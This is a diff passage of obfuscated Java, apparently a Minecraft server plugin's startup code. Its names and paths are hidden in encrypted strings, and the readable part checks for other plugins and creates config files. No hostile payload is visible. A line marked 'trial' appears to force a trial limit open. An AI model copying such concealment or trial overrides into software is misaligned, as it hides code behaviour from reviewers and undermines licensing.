d("oASlR2McD1ztte65Phz3Y0iUDt+Ej+GOdbZB45U/", Vt.STRING);this.fdon34d43d = (String) d("jcSXEW3Z3scFMtXkif95CLUN/GcxgRgHoptcX5pOI7CFip5LHw==", Vt.STRING);this.ifpndoi3nd34 = (String) d("zvNpIRCDaVpQNJsZIrVBHZdKIg1qpI+gtIlAtatoOm2r", Vt.STRING);this.nodyu3pnd43d = (String) d("l3W1cavhuP6SVA5rfbOnZLAp9p8lpqsafOYnN6yLISCrzNpiu03xiAWQGfok26Xvm/agO4BU7f2789vVttRLajpau0rDoYre8Ei1bUEcrGfwEzgsnLQb+qX+5Wltzr0msKetOZy/", Vt.STRING);this.wfnitfwtd = (String) d("d94RwwHVPw6+tZdPuNlEx1cQu8cEnjGVpWrEFeY1Us4g1X1jrcxx5W1HPyX5/IdQ9XVeoFO7ht91EDY=", Vt.STRING);this.nydufpnbfpbfpb = (String) d("PWtfnR6Q7l4+nloo1d8g2Pg57qRyti9z/1iQMk8c5x1GBxWLuSizJTqm8DcmIO7Pfb2g7Q==", Vt.STRING);this.yfpdnofayundfpd = (String) d("lxu4A7Zbr8szq2vaXM52yHSYegXhsGgnaLanWf6XnjuUcX5xsR4ICEUeNaBHPMBjwjvbQ6d6TD1h+V+COU7uT5k4VGG/gBzCaA==", Vt.STRING);this.fydnofyapudnfpd = (String) d("JlqbmQSb3UJ2ItwvgUzRMHGfDlYu66zdcdI/LmqFTgAdmhGSYY0xWqfrXcyirQlxodvxdHrkeQ==", Vt.STRING);this.opdnd34d = (String) d("K3fCTLSkZuN7nLINOiqC15/0ICa7/CSzHvkBCzQVHkBmtzo=", Vt.STRING);this.ipfnedfipdnpd = (String) d("2HH0Lqeg1p05U7QG+lnXc7Hf0KRNdN0Q8YJ1DK5BDXYLKsx/K8KaqPOIt/zo", Vt.STRING);this.fypdnafoypudn = (String) d("HpklLmrdCWLhOscHzewunV9E9aK3CUG1v2Abok5oKO0gYjdjI6i1uw==", Vt.STRING);this.fpdnafpduyn = (String) d("susRTL86FUFDicxc8A+5juIsQZ53EZ0vN4Rlnk8+CODYGEwM4BOlQjXl", Vt.STRING);this.ypdn3oypdun = (String) d("rHpoGuOk4Z7blXXHi0S61q6ln8zw6uZkzSLl/yWZ7/DSnqkj36S3rw==", Vt.STRING);this.nyduk34 = (String) d("s23Vn9ImJ6oDPIjg1hxc/5GBMVLB0BcxVrVJQ3RrFqlQWFgUnhnaE0U=", Vt.STRING);this.y34udky3d = (String) d("VLsLVAkfMihujNn8BBGu4Mz1mlRMmUASprcyj/nkjE98bQ==", Vt.STRING);this.ydu3k4ybd3pd = (String) d("6x4EmIoRASFTC/mdKU3jdx3KBvNrYs8Pyvj1PHfdAcazE666FJt+yUrMY9Xb5ldZzA==", Vt.STRING);this.ypfuwnvwfpd = (String) d("B/UW7I0G8hxOJJ5L4+58rZFbB8439W0+xVIakzu4q7CeJH9E4FSIDKegCA12N+yEkXFgnhw6O7LCYOxCGd1ArJZvfmNClDb8H9c5wUbI2PWBgDlOAQx6Uyj3orWK+4WeOzylzX7LWXPnD0rNnprsWVO3kjXck7Yc3a9RZ+JO", Vt.STRING);this.y4dnyfwudn = (String) d("XjtnjsrwEqee6cpgqTAh2QLn23+wsatZueV4uh5C5aNL2wyry+K6os+vMyC114J5uH3/993Y5VPu4B3iHxIqxgGH2Kpla+Tuv11LDnfdM/ckyWCzQSRWnGbvPuUxNQ==", Vt.STRING);this.finovayfupbnyfpubhofpubnfp = (String) d("5oYGX63ATS1r/uTujILUPsfEI6rfhPHfsjhAnLNbnXyZxjqxeG7D7/8gwvA2spHiAJ/JQbitBVMSFK9cZUf2plo0NkFx/OzjuNvMjdWpYYb1FNS+5xe9kcwnKinn5iIi8EKNDJM25QdbNmQs", Vt.STRING);this.fpybunyu43nb = (String) d("azN+qWTyd9FuLJSQmTdALOX/wSxI+iHhrcD5o8HuI3BtDEal", Vt.STRING);this.pyndy3upnbd = (String) d("EFfsipkMeZGBfjMuzgrb5Kq734kITld18oIuRdBAJU+dNf4UZG8kr/OA4zhYKyhvarOiHUar", Vt.STRING);this.ypu3bnyfpubn = (String) d("XLx1pK8xnNZtmtAwcTNNfcc4HWxcWNIFBBMKoIALNobWuj4f", Vt.STRING);this.ywofpdnvoypu = (String) d("F0FDyPyBstDA4NeGqr4//iAyE61ZdY+lYp5O1FD6lZnic5ub4xw/QNM5fis=", Vt.STRING);this.yvunoyup3 = (String) d("WqCpuggnl2vzkB58lywIRmzA6lfXcPVtC/0yDP6IO9UpPEHyhKFJ", Vt.STRING);this.nytuwfntf = (String) d("V8nXRALKuRaJNoaMDruZZfIBzrNoxY9ctY5jcvG4C/FLmPk=", Vt.STRING);this.wkyvuwftnwfyutn = (String) d("+2FVEK7+BtKCTqRkPnWAClBMcRC6+lE9YPZvQJDPD4U=", Vt.STRING);this.yuntunyun342 = (String) d("GP7DiZ0bsUIllNazFPEr5QhKIoRRpnVODu7qvQh67OA0th3kdjkIbhbYzkg=", Vt.STRING);this.yunduyn4 = (String) d("wMtcG3cCql1UfhNC3WIw3o5ScZbM/2pT2bdY7cxA8Aj1suGOXa5Mfg==", Vt.STRING);this.vkdyunt = (String) d("dhPum8DfU0a1aLbC70bu2uhvRotXPZ4MN2s0FNqnIBVs8VOI5vyd", Vt.STRING);this.ktyunt32 = (String) d("OPB+2Rtl7V+QeYtiC7zJ1ZkxTJF56orHLgjroH+MmVmdcEdn6weu4xG6BNQInz6c", Vt.STRING);this.ydny32u4nd24d = (String) d("+d0yvND6uk2QpRWWHrLL/LRHbJrg+TlHPPx+/DrLMtr9Vq7BSZ2r0/SAcEADRGH1cM9HyEh8jAoz+XQk", Vt.STRING);this.ntynu23nt = (String) d("sLF61G/iK+EY+vZEt9ES35v07geMeGdI3je7Lb44dhTTwy+njJiJZg==", Vt.STRING);this.vyf3b3 = (String) d("/SEer0nzBi2uNC4XW0y33+ZEt5El9OvU1ec4dCyDY7i0FEgFDQ==", Vt.STRING);this.t2u3nty23unt = (String) d("Kjex+9fnXsll06kEumV0Y9hG7380CLeAa6n9Pd9OszkcYp6AVgK1ymkvMIYA2w==", Vt.STRING);this.yfwunvtyn = (String) d("AGxDwvtvGnaD/rIvoMzPHxRNLkZ3hiR/Hl/7m1+zPrlEnOca3dzbjxN5P3AO2SHtqTPNcSj3GAIf", Vt.STRING);this.ytunyun4 = (String) d("Ie/9diS1urPYCCHFDzuwV+oRUn3vbxZ9LOokbySz7BE2wQyThzh6s625kSh3GznpHHNkMjwNro1Nobgwd3qq4MXXHlSM7zN2ME54ag==", Vt.STRING);this.ydnyu3n4d = (String) d("TUHzooTsAuHszW3WADpONMEmJhiuhxbOLJrGi/6HDM4p16MKgQPoCqkuT7E5Uin9TfnqJBv/F+z1BaAV4g71p7XqfdSH0jEYUw==", Vt.STRING);this.ny2u4ndt23d = (String) d("34stYElCBGrm9xZgatktwQTKmFeqqevuUojMmCTPcqZ1JP6beDg5A7tUZIl9303uJZNilpWhgkFvdg8LobES1GI=", Vt.STRING);this.uydn2yu3nd23 = (String) d("hhGdhAGbuVYOIQP/QFp81FKhknSIiPO7rPq+uRtGNGRaeZHjBQYAgEE426XeO+E=", Vt.STRING);this.ydny3udno34yduhn3d = (String) d("bt1TE4G1z7ZLMMi10z9NC1algdBZV4ua0A9SxJYG/dDJccSzZCWmqg4Xy6fRG/A7vg==", Vt.STRING);this.yndoyund4 = (String) d("TLfVdvRjg2E71oBA2guDOz+5XOVyfJPKz+it/yWzXr7R9RxKo6bu7g==", Vt.STRING);this.udny3u4nd = (String) d("GvFNWAjGIiujnhqlr4lbLvvWhNHvU6RK0TzLR48ja9udDk9CDaKxWtIRSdtQiFvjmvLF0Mtp", Vt.STRING);this.dny324d = (String) d("9cpseIjFKHtK4g3E39Q5DcPEqzLtipGAEtiY2Owxa40jUpSjoh3mCW0k3qbEhA==", Vt.STRING);this.yutn23 = (String) d("LsYcJ1vsBa0d9V/OfmU2iVPr4BbXQOku7KYrA0AG79LDJMbA", Vt.STRING);this.dy3und3u4d = (String) d("KDVCmbPkTyyn511r+HRAPh8XgEafHiHJY5TVYJyZ6+cZfG4km/p4og==", Vt.STRING);this.tyun2 = (String) d("fhUSCFdKRvfda2JOcqGB8XgN3ZksoCrEq70CbnodgMzKGuvJ", Vt.STRING);this.ydun2d = (String) d("AW61HaBIklcMcWYMN9RuArfddqkncA8xA4hUy2+F82OCYNH6soAKsTA=", Vt.STRING);this.ytun23yutn = (String) d("sGENo4OWZMSWj8PQz/1OdCVjVFb+8CWro6UReKq5Ifks6mrK+EMxjMQm9X6t6JX5wQ==", Vt.STRING);this.tyn23yunt32t = (String) d("g/fIv75a5zbo5jl9UKKicChx7ickY3/bK5YxboriaaFgPWFubJvyot1wucwF", Vt.STRING);this.ydtun34ydun = (String) d("WARvliZXUafPi8AvEGDMx4VeObwRU47/i1tSBznullmAoauwOGldgfpHNn9rA0xgwv/WVsCjdjSc1vliK236Ig==", Vt.STRING);this.tnyu2nt23 = (String) d("6PMSrUZtLkwcbu04oub9QNMMeLos/0EcoZ9qVVJr6mEKomo=", Vt.STRING);this.ydn2ydun = (String) d("YGysthxXLOjl1OSFehIUrgRk7fiDwmAsJhtNrcxR7h1LU0Ca+Nc=", Vt.STRING);this.dny34und = (String) d("p6reCvYMStzynWmdr9e/77oXlm3k2kjjVe358TGY+gFOl19WkfRPM7fcTbumW8lr6EjoUmczOukgiH2DW12ibM5s1h9N", Vt.STRING);this.vyn3vy3v = (String) d("sDBdwn/Kc+PjYTbsdkIVTvvK4UF+IrS+SUkS+0cX4yyPZPd8YBxcXWlaz5pqBuGtstWgqkaS18kqja23QL8=", Vt.STRING);this.wyunvywufntd = (String) d("wpalpYTII0ZexO4WQ5Ym6FtQ9xUcNVek5IwNsdRPG8C2ktZlCC/TMPDpdi5ZKblpf3lJJgTlAXo=", Vt.STRING);this.dyo3npd3d = (String) d("tpRgCnIJUUN9oemnKZglSxj05T+AvHT6UWjZhL3RI16QNI0B5w==", Vt.STRING);this.dyn2yudn24 = (String) d("HCNXTs11uCUSjMXavhbkr7ns7dsT1syIjbmzgnptDPbeHX1bqg==", Vt.STRING);this.dyun3ydun3d = (String) d("M3xenV1VGpc2346ox2OjYhxEv53rvLYIYp/gM8pqxz5/roJtxw4=", Vt.STRING);this.y2un34yudn234d = (String) d("JgnpMhUL2IraNOzdABBnbqQK1h7PY/e9aJbGSxyXI5l9//jUJK0=", Vt.STRING);this.tyun2t = (String) d("Dte7dtoaTUA4otCKMCQRgsBCiGR35rLSj0Nqv2dRL63PYhULfw==", Vt.STRING);this.kd3nd = (String) d("VH+FPYjIh9qvzMX+tXTtX4k9gjp2fOa5Uym1UY1MhGIB19msog==", Vt.STRING);this.dny2udt = (String) d("WGLOUfUxbTm5l/aAJGnQdl2yrwc4aaAm8XXgljl+PWqR0HrDlmwe", Vt.STRING);this.ntyu2n3t = (String) d("tkLbeMo1mbYK5UEOYxsq6EJ6mcIUNRVuGlodJ03Yzw2/sWdySYnzK/2OcQ==", Vt.STRING);this.kyut2n2u3nt = (String) d("6R2vftoUW0bdvpmTPrUDa37x62LHAmvO+Iw2ZbE/h9TwN1EjQT/cN7qFQw==", Vt.STRING);this.yntu2nt = (String) d("BF5xQdDtv/c7LGxgB+vKDVoCpKlW06Y9QQ6/iJ8NdEX8iorLHH61YhvImvvvF/j7HCs=", Vt.STRING);this.nyup23np = (String) d("CGKESi4vTjcnNtbX9ldPMl/SoSCahZipER9l52dzlgOkWnjjauR6zohVrAMQN+M+Um78C3aYpOqqtqVEDpB7kzo=", Vt.STRING);this.tn2yu3tn2 = (String) d("jUhA4Rua1bGKl+TpaouD0xfvQsgTF6ncGb1te010XTm8fnzeT+AaIg==", Vt.STRING);this.tn2ytn23t = (String) d("vRlGtkZzbXGiVGgkwzOzqVr4S688WP9lSZloYWRmXXYukZvLYD9vP4Kn", Vt.STRING);this.ytnfyu3ndt34f = (String) d("rhJBaoGnOWN8TAcsQT6FEiyPikyU+HEz+7btrBl311+ilabd5vCQveuYj5XN9Cc=", Vt.STRING);this.tuyn2y3utn2t = (String) d("Qs2KEWs2I9OrN76rtBAe6gNE5Aj60u/iVh02psKelhv8BnEpjZ7EIWLW5/wnJy3NNFD1lGHefkdkbY/kMw==", Vt.STRING);this.tyun23utyn23t = (String) d("RnyWxVIa9AITI+zb6eYd/pIlm0Je4qBu3+q89cLC8vKawGSYJePnIvRXwg==", Vt.STRING);this.tyu23nt23t = (String) d("8P3xrhwrebjH6d1Ka2QjW5vukGkNsBhQ2fVgGUoBYBIC4W0=", Vt.STRING);this.tyn2fnt2 = (String) d("FgFRPrjC2jFZEyytELuuMO/zamhRlNMWJPvkTwv2kRsYyHuY", Vt.STRING);this.knde43d = (String) d("kke7woCl7WOJvw+IAZFiT8Nbfap+SUp5JxxYQK/VGEM=", Vt.STRING);this.ynvkypn3v3 = (String) d("M78IBiyzDunsI28OacBMvZj7CXqGfOB9j7C2DUgsNqP8a/Z0qUt4FDfQQJprDiEEZPA6hO5KxiRbx2A=", Vt.STRING);this.kientien2t = (String) d("cKRjtnuL1vQlnbi0IRGPSZR/6phDpTBtjcAfr51XJ/4pVDbmWAXVV/oeRbv0gQbA", Vt.STRING);this.tyu23ntyu23nt = (String) d("bOg8AieI8miqvjHY1hnz38OwyEnhuVdKQvrN5PBw9j8/L6h1HQJBhT2pdf5jn30=", Vt.STRING);this.tynwdy2d = (String) d("iU/mJMoRtZGjD1j6XmXicWKTLP+fEzfqY7CzsePlKKO1eJBtwAUU6w==", Vt.STRING);this.uydn3yund = (String) d("B+Bh058bseEGadCfs7sbF7CPqp+AWXNdUtgdikIX3mv9C5r0A/xtH72gNLA=", Vt.STRING);this.yuntyun2t = (String) d("JRyj1/nm9hLUGIlAKp/QrS82Tq3gPnr5avc2okJ7nM8=", Vt.STRING);this.dyn3ydun = (String) d("j4bRzPevTP+aB1R+Lg0HFg5nj9HmOWJoHK3xA2xHgg1l2H1i", Vt.STRING);this.ydn3yudn34d = (String) d("aAe3dJh1EX3q8stcSOVbnA7mt/bBmxCsauJnqUeDYxAS3MrAw4eOeQ==", Vt.STRING);this.dyu42ndyu432nd = (String) d("WDm82iqXI2ITw0lzXI4Psm2ffI8tOqIwOotxzlqruOlNyva780ep", Vt.STRING);this.fuytn2yudt = (String) d("f0N6hKrbBkkQwNs5dMkaCPpn8Rcry/FeJNOLQY1LqqQus31icYFD4tRx/ibL/Q==", Vt.STRING);this.yundt2yud = (String) d("4EAdq1qWEtszl2wlVw78G7AxRXhAHH2vl8PMztYNP14=", Vt.STRING);this.y3udny3u4nd34d = (String) d("4SkWt+hcPzh6oHN94ubpIdmw6QnQHgQIZH/9J3KUXhvbcmWWWDBLjnXVbmvw9olJKQ==", Vt.STRING);this.yundyu34nd = (String) d("sqZdRa01bicwYCk1i6hJAO5UDYOa3gHxvRqEK/XubhAT1e2TvR5g7LmhLzfdmJlYbdyKI5V0G28I2Q==", Vt.STRING);this.yufdtnoyupnd3d = (String) d("IJnVKlQiRqmXg6BgHyq5ESwlqLZQ0LEH8AgSnQJozwqNpPN3dd4IiBgZbzq1v28p9VRa1WxfPFhGuDIKDqJfJ0k=", Vt.STRING);this.udn3y4udn34ydu = (String) d("OXuw3mnlA1SRB45HpeijPAtpGW6gGVY2B/OEdlU1l2B3FHj/AoP1m63C2uH/qfoqv8f1D4McKQZl+FkjacARa6PySFxas14=", Vt.STRING);this.yudnyu43nd = (String) d("A1L0omXsq8TufrmC9C2FbWCrUocWbk/G3T0MtB4NBOt2ObXi/lnaFLhOUQE9Bb2L4QyihiKXsCW1Nzh+3OrccUJ4WnmowMc=", Vt.STRING);this.ydn3y4d = (String) d("rMlGinBb00DEYNSE+pAFvrxecoHAcPEji9mHqWGvAElbS1ubvWxGog8z+4toLcZJIubnUG7Xv1INxRBm7U0fHE++og1MXBuZ6Pr9ZlVSMUWu", Vt.STRING);this.y4dun3y4udn34 = (String) d("uOMA6YtDhcHcUw/1t3CbBGyyqu4T0o980vAtxK5VwsPKt+mQ8jwg", Vt.STRING);this.dyu24ndyu24nd2d = (String) d("WxSc2gQiip1LZvwOasZWIM0wF+vH/HtSLi71L8X3BLYVcEu+/U5M0EqNH9wmb51SEg==", Vt.STRING);this.dyn34ydun3d4 = (String) d("upujfp37MqND52LmVmZzyEpuFSQ/nNWhTegzkyHo2FGPcw1qHSSgX6JjEO71THTVZTS/pYw=", Vt.STRING);this.udnyupndpd = (Double) d("9X/AJqcP/ADDbbWoOatBWBKpi/AObIevHnErGEaNSg==", Vt.DOUBLE);this.do3ndyu3pnd3d = (String) d("kFslObLWtt6X6vXV04vDABGDYo+vfG2Z2JM7xI48bqI=", Vt.STRING);this.dnpyuadnyfpudnfpdfpd = (String) d("Wj6cmGMhxtVMz2iy13Z2mnN3d9Z+wJNnVpSIrdOcXZB2+BF14aXJKKXZcOwTIkioDhqIkdbOm/fBKmuWGi+e+TvDf8nERou+K1nbAHm3ON1XffqLjXNpc8/yh7SdjNxFYLxnoaP5sPiH+Ro/vdBK/ANdpqrW98W8bCbdYv0arnAFKHVdSFg6weNNlcmxQlcH2TvMX24a22GcmF7sT3LT577FKZHp8M4mGUZjI0fP33mZRXAyj44s/y4hfyjSKoIz+noJFPHlGyr3IaRYh49oN+/Iv0HKGMNQvQCa/Hjv6xX0w9aO6WtwJWztX6ZEKmjN9lAkp0eASVecK+98pslHY92CDRK4DJm57dRBNhSUBR3EcY2sg1zWJvaLTrs8WIg/8ZctkJNCHAYXstbMcFJo2h6+utHxZR5Ov1N3qgGYVLhkl7rj09LFpbpBu1vJu3RH8yzzzi/Gx+IajsrpHkkkVwng1QSTeogfn3U7Iw2aHNFZu6Xuu2gZbn5EshHdAWuep+vwunLsL9DE715hjPYjKeEFP+sb63/Vn9zFWQLju5Qu8aSG/BKPxzEdA6PzVc8CbG2IYZZFL+8D+7B585ISJgp/kSdkbVlRVKmecZkGQoUlr8rv802IbQYK62ZmuqbahjpDZgR3SR7aMoIXqDpGlfPB8+N5WTxVC5c6NbXF2pv8wKfN+th64zqjGmFh0sDQiocmygCwkqCsrOQEqHiGhnooHIntKmHa6J14FNpMwktLXkrzQyu7zT4mUiGUr78El6eOc7/vzAMIihn/D9viT1LTA3T0S2UwRP/9xKIRJW0Okd6YP9WjUgJYRJTDftnzDfFgauPpxfMsNMn5o4xyDbETrdlS9OIuWp5cOyWYk+7lTnU1VjRs2wRmUml8WrF832LNuc1ISvqGg5a2/eZqcEczyvIr4Ofgzspp2ZmdhMvHw7yxdPiSB+bbmyQ+z0cBvWLHJu7ngdTs7IJvyVBwEeBpWdtasW2im7rzm92HlipEjmsBRuxM1FbhrTw89/L2xe9oazMrlRBJzH/V3VYUaAJCI1ZtTZ4utgG2BpiY9bXaSl1LWtlpC8AA7dDk/Miyp9zSJA==", Vt.STRING);this.dy3updnyapudny34undh = (String) d("RafM/46sBcQ/Vxd5Bx3DiLOeiVBukRR2CpEGjULp6xTwkSIP6rI=", Vt.STRING);this.dnyu3nd3d = (String) d("TgEZBxnjFw+VpLGOaKpYJkccUAxNbhUrRcrMu05eZ7gUZ4YMrAvi5Qyj1REthumTLZKNdwtqDuMFekA1NHOPtIW1X803rTOGPV4OM203Yj1+wX/BVFjvW9LwbxHdr/6tjsMNbJU4YZwfxU4WC1KY", Vt.STRING);this.dk3ed34dyu3nd = (String) d("8SXnBJn7/YoaVdiTx71l5DoBdD0wuk/g1P77IEaLI/Q63G9ojP02GJJIfhGvvCMHueh3fpu5bR9bTGh/iK1p8Vci5gh9SVdspESqUvsAlNan/MXQ3bnfWO7LrQ4/FCDS", Vt.STRING);this.yudyu2dnyu42dn2d42d = (String) d("TDwDh52nNBiFOA95UVLbyFUEdpwZnR7U0MJSFUGAAjKrUwWafTbV6hff4K1CFK9ayelh8QDm5Rob1TuCEkaWOIb1c61j0VoKwDmzWP3n3j1Da/o=", Vt.STRING);this.tiewntien42 = (String) d("i6S5T/j+FQhJal+oyrnt0VXgchiIqmJIMw1/1NanzMTLT1JIf3JORpBrSzIyzv2ZDCVGtRXrP7rxKqZhM/boi2zd0NLcCGoZQONCTHOzjlGm7AW5c9wcghV0O6uPeO/35tL3jM7ybp9NL/4SqfSODMqFx1m1V2NE/V3jmMZ6eKue9tfrDdKM3h4n5NU5jeIfR6k5mbQaikB7HUBuS1NTkTGYpfDWnT9zTZ55xZhn1u93F1A9fePkibF2e6r2T9KXBdgk0lF0iUxBNqc/mHBA72fQ9sBjKvPpgwtZPWp3S9cDMn6zf752k0LV+WvIFdSpCDk6pWBbFYdAKDmGiAyPGxfAWcuNNdOA2s1PSoysaAj63A6OvhAvaJe4BukFbe8za9mOjrlTt5KgfotZC762AN0QV54VkFyB1iUdmF62m0+c0rWfx4503sKgEQEFtMDTJ22DUQsaIa9ZU3s/lf+CGZlmoDFkbFCiGwwnf0jeMpeQYaj7s9m6HkfpCFjTCgkgD8IKEMlr/lbci306I5cqfsIFkkBJLZJ5phgRNDDaxJ5JXSXnWVLbCWcy3E3vBQS8jWiGRjabuGjQRF2MOo6KCQyDDYovgy0U+O7vbQgQvP5hBzcGf1Wvkw4rCPHS4Vkgm9RkdSQddbSgLj5J9RZhVm6P2QHjCuGLn+uaaFKeZxnQ914LvfMwmTeb0DlXJUqKk9UF7qyU0oiXpzU6zIsiPVxdDUMuPi4QK8ZMkTOc/U2JcUv2tIfBpGttAtCcWMntR4/JcMRpDQyp8pevk3bTwzsE64qUJjXAYHEswG4Op6FxsbJdt3Sc5Ez0JzUTu0KzCK9hIBMs/GvZal9tiEZnFTdiR6yfbn554GFfyyS8TGwXVtLiCKdR/xuOtQcAsYMINzZj4+fkWxUVh1uG6ifuKXGPatFnojDbjFW9urPKm+qKBpp4H4iP31wMOTw5cehpHpRd3pxFyaPL2TVscju1DgmTEDr26+Xog/FYeJDPTHr6cIgqCNtIFVTsrBPANsBdpspeloupGQ+zhElhDLqudBgWn3Hq60rPf/f1gPTXaGzsRCocDpxwptP0NcRNy+/aSIMqHzxSCYIIJowCT669r99vLduzVNkntD1dSxgVscOviM8f1RKn9QWxESNzo7S2YykkC+ToeDPKSN4GRYUIJrOx0rRUPWto4M93dqPxN84ZNGGNAj8B2THebl36yGxct8fpguCRLNe8TKCmpeT0fmr51Xx0qZohui3EHgjAqObr13QskkEM0D2Ws5il5TjlD2lTVwD9u0bFHMjjMesj5IBSO4fRPtQt0EKpAUGP800RPDFtkdf7oTApHKmtWkJffmfW4b/CoeYs5/DfPB0qItAt9DukwskyXTd9a1LPTGcIfgOCk/DnPIUk8tAaCfjDHJ+mMM+v3/9EXwk2But0sUspa2OKMHtC1zcCKw==", Vt.STRING);this.y23u4ndyu3n4d = (String) d("tKPiMGpnkt9erdxDKMumuvm7EIX709gynlKRiI4GAXlwo5k2gcQW04/Fv66CANR9QhwcWay7/+dF+UxiiRk5RDAclUiDhA0iIakYnEe4CgYCTl7vLuEPszVwuhVJQ32l7Y5UeV6K4tsupmgzcScJZBVkHLzGm+YUzyYkUYkhn4D7Tn7kTDDpcWqDzoybuzIbtG4+ecKBmohgvsNSlCb0N3a6hW0CwYtgFSBvEEC+uftPD2SszEN1QK/srH/X0+9G4AvB+xoLm7fcBl8v55yWWWCZZK2qc/5aGpMoV+kd7Fj5NC51IfxHnS++gU1X/47yYVLE93QA8ewOgo4++/QLzNW6R+f/yVY/vJ1JWR2N/A==", Vt.STRING);this.dy2un4dy2u4nd4d = (String) d("kkC7cAqFWfEtXiWyDW2M0XutyGrQi+30nRIiNPYRg0roRoJgMskGFfTlNBjKT+c9CrDoj78tbuJgjNPlrCQCsV4hDQ==", Vt.STRING);this.un324yudn243yudn = (String) d("uoF41g925oXJtvZqJi3Om1cx2XVUk4oMK9QGdhbZmbJX5wCd3h/4/NFKV5mO5g==", Vt.STRING);this.u4ndy24und24yd = (String) d("dLXkOKtuMnkMSSznhCSZ/NRcT6Pl/r9aCq/aruei5DfKIWLLdYkwE2j2jY9h+oEoCKhybBpTq8ECAKMneng=", Vt.STRING);this.yudn3wypu4ndh = (String) d("l86lDr7DV3nsi2Ocw6KLRnjBrPIA713ELhT62jU5D0eq3YHQzawi/g==", Vt.STRING);this.dyu2n4dyun2f4 = (String) d("ZLRqjY+//258Gc129lgB7xJ+lhOeE6GiadxDL0nO7SNn3C31fqcn+aM=", Vt.STRING);this.y24und = (String) d("qNCoGlLxFazCnqbC+qPkVwpDxo+1i/01cq2tAGSlstqgFwnUwzlgy7UPWZew51FFKA05UBcrmgQSeNYdiNojzKlyeg==", Vt.STRING);this.y2u4dhyu2nd = (String) d("llu2VNeOU3zhiOOyLaYxBTvcHuR0p5luDHyQNcv+F+TTs0WaJSjqtpHO/crHx+9GWhNxb0uP+adPTcjwteVpg6iAOOT/", Vt.STRING);this.yn23yund2y3udn = (String) d("6tGn1MUT1y/P5tpfHurExjvBR5CgC7agZiqa7O6mRB/GaRJccPaEgxH1kntvEkMZ0AfA3Ln6Y6aqL9FRWw==", Vt.STRING);this.ydun2ydun23d = (String) d("Q7aUskZ4PB2ighVquH72rYXX2SILOrODJ0GD3m7dkcCOg1hJS8zrmA==", Vt.STRING);
+        PluginManager tyunwfdyunfwd = Bukkit.getPluginManager();
+
+        if (tyunwfdyunfwd.getPlugin(dyn2yudn24) != null && Objects.requireNonNull(tyunwfdyunfwd.getPlugin(dyn2yudn24)).isEnabled()) {
+            WorldEdit_Installed = NEW_VALUE1;
+        }
+
+        if (tyunwfdyunfwd.getPlugin(y2un34yudn234d) != null && Objects.requireNonNull(tyunwfdyunfwd.getPlugin(y2un34yudn234d)).isEnabled()) {
+            WorldGuard_Installed = NEW_VALUE1;
+        }
+
+        if (tyunwfdyunfwd.getPlugin(kd3nd) != null && Objects.requireNonNull(tyunwfdyunfwd.getPlugin(kd3nd)).isEnabled()) {
+            LuckPerms_Installed = NEW_VALUE1;
+        }
+
+        if (tyunwfdyunfwd.getPlugin(dhnfpwyadun) != null && Objects.requireNonNull(tyunwfdyunfwd.getPlugin(dhnfpwyadun)).isEnabled()) {
+            ProtocolLib_Installed = NEW_VALUE1;
+
+        } else {
+
+        }
+
+        if (tyunwfdyunfwd.getPlugin(kyut2n2u3nt) != null && Objects.requireNonNull(tyunwfdyunfwd.getPlugin(kyut2n2u3nt)).isEnabled()) {
+            GriefPrevention_Installed = NEW_VALUE1;
+        }
+
+        // xxx trial
+        SCore_Installed = true;
+        g5 = 10000000;
+
+
+        File tyu2ndyun23d = new File(dy2un4dy2u4nd4d);
+        if (!tyu2ndyun23d.exists()) {
+            tyu2ndyun23d.mkdirs();
+        }
+
+        if (!g10.exists()) g10.mkdirs();
+
+
+        this.g16 = new File(tyu2ndyun23d, un324yudn243yudn);
+        if (!g16.exists()) {
+            try {
+                g16.createNewFile();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+
+
+        this.g20 = YamlConfiguration.loadConfiguration(g16);
+        this.g13 = new File(u4ndy24und24yd);
+        if (!g13.exists()) {
+            g13.mkdirs();
+        }
+        this.g14 = new File(g13, yudn3wypu4ndh);
+        if (!g14.exists()) {
+            try {
+                g14.createNewFile();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+        this.g18 = YamlConfiguration.loadConfiguration(g14);
+
+        // Double chest database
+        this.g15 = new File(g13, dyu2n4dyun2f4);
+        if (!g15.exists()) {
+            try {
+                g15.createNewFile();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+
+
+        g28 = new String(g27);
+        this.g17 = YamlConfiguration.loadConfiguration(g15);
+
+        g12 = new File(y24und);
+        if (!g12.exists()) {
+            g12.mkdirs();
+        }
+
+        g21 = new File(y2u4dhyu2nd);
+        g22 = new LinkedHashMap<>();
+        g23();
+        this.g23 = LuckPermsProvider.get();
+        g23.getUserManager();
+
+
+        File tnyu2nd = new File(yn23yund2y3udn);
+        if (!tnyu2nd.exists()) tnyu2nd.mkdirs();
+        this.f123 = new File(tnyu2nd, ydun2ydun23d);
+        if (!f123.exists()) {
+            try { f123.createNewFile(); }
+            catch(IOException e){ e.printStackTrace(); }
+        }
+        this.g2 = YamlConfiguration.loadConfiguration(f123);
+
+
+
+        ilc();
+
+
+
+    }
 
 }
